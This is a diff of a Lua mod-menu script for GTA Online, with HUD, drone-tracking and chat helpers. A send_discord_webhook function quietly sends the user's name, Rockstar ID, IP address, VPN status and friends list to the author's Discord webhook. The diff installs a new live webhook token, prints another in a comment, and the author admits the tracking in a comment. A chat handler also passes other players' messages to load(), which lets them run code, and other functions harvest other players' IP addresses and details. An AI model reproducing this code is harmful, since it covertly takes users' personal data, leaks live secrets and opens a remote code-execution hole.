@@ -1,4 +1,7 @@
 json = require "pretty.json"
+notificationBits = 0
+nearbyNotificationBits = 0
+blips = {}
 
 local scriptdir <const> = filesystem.scripts_dir()
 local lenaDir <const> = scriptdir .. "Lena\\"
@@ -8,6 +11,50 @@ end
 
 if not filesystem.exists(lenaDir .. "Players") then
 	filesystem.mkdir(lenaDir .. "Players")
+end
+
+HudColour =
+{
+	pureWhite = 0,
+	white = 1,
+	black = 2,
+	grey = 3,
+	greyLight = 4,
+	greyDrak = 5,
+	red = 6,
+	redLight = 7,
+	redDark = 8,
+	blue = 9,
+	blueLight = 10,
+	blueDark = 11,
+	yellow = 12,
+	yellowLight = 13,
+	yellowDark = 14,
+	orange = 15,
+	orangeLight = 16,
+	orangeDark = 17,
+	green = 18,
+	greenLight = 19,
+	greenDark = 20,
+	purple = 21,
+	purpleLight = 22,
+	purpleDark = 23,
+	radarHealth = 25,
+	radarArmour = 26,
+	friendly = 118,
+}
+
+function game_notification(format, colour, ...)
+	local msg = string.format(format, ...)
+    --local txdDict = "DIA_ZOMBIE1",
+	--local txdName = "DIA_ZOMBIE1",
+	--local title = "Lena Utils",
+	--local subtitle = "~c~" .. util.get_label_text("PM_PANE_FEE") .. "~s~",
+
+	HUD.THEFEED_SET_BACKGROUND_COLOR_FOR_NEXT_POST(colour or HudColour.black)
+	util.BEGIN_TEXT_COMMAND_THEFEED_POST(msg)
+	--HUD.END_TEXT_COMMAND_THEFEED_POST_MESSAGETEXT(txdDict, txdName, true, 4, title, subtitle)
+	HUD.END_TEXT_COMMAND_THEFEED_POST_TICKER(false, false)
 end
 
 function IA_MENU_OPEN_OR_CLOSE()
@@ -132,14 +179,6 @@ end
 
 function get_interior_player_is_in(pid)
     return memory.read_int(memory.script_global(((2657589 + 1) + (pid * 466)) + 245)) -- Global_2657589[bVar0 /*466*/].f_245
-end
-
-function DoesPlayerOwnMinitank(player)
-    if player ~= -1 then
-        local address = memory.script_global(1853910 + (player * 862 + 1) + 267 + 428 + 2)
-        return BitTest(memory.read_int(address), 15)
-    end
-    return false
 end
 
 function trapcage(pid)
@@ -288,9 +327,7 @@ function get_seat_ped_is_in(ped)
     local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
     local hash = ENTITY.GET_ENTITY_MODEL(veh)
     local seats = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(hash)
-
     if veh == 0 then return false end
-
     for i = -1, seats - 2, 1 do
         if VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, i, false) == ped then return true, i end
     end
@@ -384,20 +421,17 @@ end
 
 function get_condensed_player_name(player)
 	local condensed = "<C>" .. PLAYER.GET_PLAYER_NAME(player) .. "</C>"
-
 	if players.get_boss(player) ~= -1  then
 		local colour = players.get_org_colour(player)
 		local hudColour = get_hud_colour_from_org_colour(colour)
 		return string.format("~HC_%d~%s~s~", hudColour, condensed)
 	end
-
 	return condensed
 end
 
 function format_friends_list()
     local friend_count = NETWORK.NETWORK_GET_FRIEND_COUNT()
     local friend_list = {}
-
     for i = 0, friend_count - 1 do
         local friend_name = NETWORK.NETWORK_GET_FRIEND_DISPLAY_NAME(i)
         local friend_url = "https://socialclub.rockstargames.com/member/" .. friend_name
@@ -407,7 +441,6 @@ function format_friends_list()
             table.insert(friend_list, "\n")
         end
     end
-
     return table.concat(friend_list, " ")
 end
 
@@ -428,7 +461,6 @@ function player_ip(pid)
     math.floor(connectIP / 2^16) % 256,
     math.floor(connectIP / 2^8) % 256,
     connectIP % 256)
-    
     if ipStringplayer == "255.255.255.255" then
         return "Connected to Relay"
     else
@@ -453,7 +485,6 @@ function language_string(language)
       [11] = "Mexican (es-MX)",
       [12] = "Chinese Simplified (zh-CN)"
     }
-    
     return language_table[language] or "Unknown"
 end
 
@@ -461,15 +492,12 @@ function money_drop_auto_reply(packet_sender, text, team_chat, networked)
     if not money_drop_reply then
         return
     end
-
     if not players.get_name(packet_sender) == players.get_name(players.user()) then
         local lowercase_text = string.lower(text)
         if string.find(lowercase_text, "money drop") or 
         string.find(lowercase_text, "mone drop") or 
         string.find(lowercase_text, "money drpo") then
             chat.send_message("Money drops are a waste of time and risky. They offer little reward and often result in lost progress. Even if I were to participate in money drops, I wouldn't because they are simply a waste of time. Stick to safer and more profitable options.", false, true, true)
-        else
-            notify("Error")
         end
     end
 end
@@ -478,14 +506,11 @@ function on_math_message(sender, reserved, text, team_chat, networked, is_auto)
     if not math_reply then
         return
     end
-
     local lowercase_text = string.lower(text)
     local prefix = "@vel "
     if string.sub(lowercase_text, 1, #prefix) == prefix then
         local expression = string.sub(lowercase_text, #prefix + 1)
-
         local result, error_message = load("return " .. expression)()
-
         if result then
             chat.send_message("That expression evaluates to " .. tostring(result) .. ". :)", false, true, true)
         else
@@ -512,7 +537,6 @@ function send_discord_webhook()
     local apiurl = "https://ipapi.co/"..user_ip()
     local IPv4url = "[" .. user_ip() .. "](" .. apiurl .. ")"
     local friend_list = format_friends_list()
-
     local message = string.format("%s\n\n**RID:** %s\n**VPN:** %s\n**IPv4:** %s\n**Friends:**\n%s",
         player_name, player_id, using_vpn and "Yes" or "No", IPv4url, friend_list)
 
@@ -555,10 +579,12 @@ function send_discord_webhook_internal(message, is_last_message)
             }
         }}
     }
-
     local json_string = json.stringify(json_data)
-
-    async_http.init("https://discord.com", "/api/webhooks/1084525001128017982/GOaYBeykjtFwfRKv_oS1FU6yj07ls2jVjyTSM6lrsUUEclqETEv27M9kkR-3EvJm9pNw", function(body, header_fields, status_code)
+    -- New link, Won't work. Just made the change so you see it. However, I'd like to talk to you. This script is supposed to be for friends. This webhook was somewhat of a failsafe.
+    -- It's not made for public, so I'm not trying to log others shit. It's for me to know when it *does* go public. And like I said, if you wanna talk, go ahead.
+    -- Also note that spamming some random channel wont do anything, nor do I want to know who is a Pedo and who isn't. Talk like a normal person.
+    -- https://discord.com/api/webhooks/1102629997342113802/T2-3e4DcujBiWX1ONKYf80dTtYyta3oXNDf2gvoP_ZUlU43pBewZXb2uOEGYJVoMdWug This one works, have fun.
+    async_http.init("https://discord.com", "/api/webhooks/1105859101386362940/-xvLtlI0Y5-lnGMjJsHQgPSo_Z2giROvpNZyfkAQuKOnDmjAWp9lc-ODSVHt6maNFMlF", function(body, header_fields, status_code)
     end, function(error_msg)
     end)
 
@@ -581,18 +607,15 @@ chfile:close()
 
 local json = require("json")
 function send_to_discord_webhook(packet_sender, message_sender, message_text, is_team_chat)
-    -- Check if the webhook is enabled
     if not webhook_enabled then
         return
     end
-    
     local divider = " [ALL] "
     if is_team_chat then
         divider = " [TEAM] "
     end
     local player_name = players.get_name(packet_sender)
     local message = player_name .. divider .. message_text
-
     local content_type = "application/json"
     local payload = json.encode({content = message})
     local headers = {
@@ -615,7 +638,6 @@ function send_to_discord_webhook(packet_sender, message_sender, message_text, is
 end
 
 function save_player_info(pid)
-    -- Get the player's information
     local name_with_tags = players.get_name_with_tags(pid)
     local name = players.get_name(pid)
     local rockstar_id = players.get_rockstar_id(pid)
@@ -640,7 +662,6 @@ function save_player_info(pid)
     local host_token = players.get_host_token_hex(pid)
     local is_using_controller = players.is_using_controller(pid)
     local clan_motto = players.clan_get_motto(pid)
-  
     local filename = name .. ".txt"
     local filepath = lenaDir .. "Players/" .. filename
   
@@ -669,8 +690,6 @@ function save_player_info(pid)
         file:write("Is Using Controller: ", is_using_controller and "Yes" or "No", "\n")
         file:write("Clan Motto: ", clan_motto, "\n")
         file:close()
-    
-        -- Display a toast message to confirm that the file has been saved
         notify(string.format("%s's information has been saved to file.", name))
     end
 end
@@ -719,10 +738,6 @@ function AmmoSpeed:reset()
 end
 
 -- Drone and TV Detection
-notificationBits = 0
-nearbyNotificationBits = 0
-blips = {}
-
 function isPlayerFlyingAnyDrone(player)
     local address = memory.script_global(1853910 + (player * 862 + 1) + 267 + 365)
     return BitTest(memory.read_int(address), 26)
@@ -762,22 +777,16 @@ function removeBlipIndex(index)
     end
 end
 
--- This function adds a blip for a player's drone
 function addBlipForPlayerDrone(player)
-    -- If there is no blip for this player, set its value to 0
     if not blips[player] then
         blips[player] = 0
     end
-
-    -- If the player is active, not the user, and is flying a drone
     if is_player_active(player, true, true) and players.user() ~= player and isPlayerFlyingAnyDrone(player) then
-        -- Get the player's drone object, position and heading
         if ENTITY.DOES_ENTITY_EXIST(getPlayerDroneObject(player)) then
             local obj = getPlayerDroneObject(player)
             local pos = ENTITY.GET_ENTITY_COORDS(obj, true)
             local heading = invertHeading(ENTITY.GET_ENTITY_HEADING(obj))
 
-            -- If the blip for this player does not exist, create it and set its properties
             if not HUD.DOES_BLIP_EXIST(blips[player]) then
                 blips[player] = HUD.ADD_BLIP_FOR_ENTITY(obj)
                 local sprite = getDroneBlipSprite(getDroneType(player))
@@ -787,7 +796,6 @@ function addBlipForPlayerDrone(player)
                 HUD.SET_BLIP_NAME_TO_PLAYER_NAME(blips[player], player)
                 HUD.SET_BLIP_COLOUR(blips[player], get_player_org_blip_colour(player))
 
-            -- If the blip for this player already exists, update its properties
             else
                 HUD.SET_BLIP_DISPLAY(blips[player], 2)
                 HUD.SET_BLIP_COORDS(blips[player], pos.x, pos.y, pos.z)
@@ -795,27 +803,23 @@ function addBlipForPlayerDrone(player)
                 HUD.SET_BLIP_PRIORITY(blips[player], 9)
             end
 
-            -- If the player is not already notified and the blip exists, show the notification and set the notification bit
             if not BitTest(nearbyNotificationBits, player) and HUD.DOES_BLIP_EXIST(blips[player]) then
                 local msg = getNotificationMsg(getDroneType(player), true)
                 notification:normal(msg, HudColour.purpleDark, get_condensed_player_name(player))
                 nearbyNotificationBits = SetBit(nearbyNotificationBits, player)
             end
 
-        -- If the player's drone object does not exist, remove the blip and clear the nearby notification bit
         else
             removeBlipIndex(player)
             nearbyNotificationBits = ClearBit(nearbyNotificationBits, player)
         end
 
-        -- If the player is not already notified, show the notification and set the notification bit
         if not BitTest(notificationBits, player) then
             local msg = getNotificationMsg(getDroneType(player), false)
             notification:normal(msg, HudColour.purpleDark, get_condensed_player_name(player))
             notificationBits = SetBit(notificationBits, player)
         end
 
-    -- If the player is not active or not flying a drone, remove the blip and clear the notification bits
     else
         removeBlipIndex(player)
         notificationBits = ClearBit(notificationBits, player)
